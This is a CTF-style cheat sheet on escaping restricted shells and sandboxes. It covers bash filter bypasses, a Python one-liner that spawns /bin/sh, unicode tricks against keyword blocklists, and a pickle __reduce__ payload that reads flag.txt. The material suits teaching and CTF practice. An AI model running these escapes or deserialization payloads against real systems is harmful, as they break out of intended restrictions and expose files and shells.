# Escape

## Homebrew shells

[List for \*nix](https://gtfobins.github.io/) \([Tool](https://github.com/mzfr/go-gtfo)\)  
[List for windows](https://lolbas-project.github.io/)

If the challenge is a homemade shell with some artificial limitations, gtfobins and LOLBAS list myriad ways to escape. These aren't vulnerabilities, per se, but intended functionality of applications that are commonly installed.

## Bash

[Good ideas](https://wiki.bash-hackers.org)  
[List of parameter expansions](https://wiki.bash-hackers.org/syntax/pe)

### Forbidden strings

```bash
${NOSUCHVAR:-fla}${NOSUCHVAR:-g.txt}    # expands to flag.txt
```

### Stars aren't the only wildcard

```bash
fla?.txt
fl{a,A}g.txt
fl[a-z]g.txt
```

## Docker

* [deepce](https://github.com/stealthcopter/deepce/), a vulnerability scanner.  
* [grype](https://github.com/anchore/grype), a vulnerability scanner.  
* [WhaleScan](https://github.com/nccgroup/whalescan), scans windows containers.

## Electron

[Tell me more](https://github.com/doyensec/awesome-electronjs-hacking)

[view-source:](https://twitter.com/HusseiN98D/status/1325464364569276417) isn't necessarily blocked like `file://` is.

Perhaps the app even uses its own [custom URI scheme](https://twitter.com/zer0pwn/status/1325581291060826112)?

## git

[git-shell](https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/) tries to be restrictive server-side, but might not be.

## Javascript

[Sandboxes](https://d0nut.medium.com/why-building-a-sandbox-in-pure-javascript-is-a-fools-errand-d425b77b2899)

## Python

[Tell me more](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)

Python has **so many** ways to introspect, reflect, reload, import, execute unintended code.

Here's a pretty simple one:

```python
import statistics
statistics.random._os._execvpe("/bin/sh", [], {})
```

### Forbidden strings

If there's some sort of word blocklist, try unicode:

```python
>>> 𝖕𝖗𝖎𝖓𝖙(1)
1
```

Python runs it just fine.

### Pickle

[Source](https://gist.github.com/toblu302/364c3b474c4148295fdee9bd0207e758)

```python
#!/usr/bin/env python3

# From the error message we can see that only __main__, __buitin__ and copyreg are allowed
# __builtin__.eval and __builtin__.exec are banned as well
# We can just open and print the flag.txt by using __builin__.open, followed by readline and print
# This sequence of calls is constructed below by using multiple objects and the pickle __reduce__ interface

import base64
import builtins
import pickle

class FlagObjPickle:
    def __reduce__(self):
        return builtins.open, ("./flag.txt",)
    def readlines(self):
        pass

class ReadFlagPickle:
    def __reduce__(self):
        return FlagObjPickle().readlines, tuple()

class PrintFlagPickle:
    def __reduce__(self):
        return builtins.print, (ReadFlagPickle(),)

a = PrintFlagPickle()
pickled = pickle.dumps(a, 0)
```

Any callable in the target's namespace can be called with \(almost\) arbitrary parameters by pickling a class which implements `__reduce__`. Return the callable and a tuple of arguments. See above for a technique to chain as well.

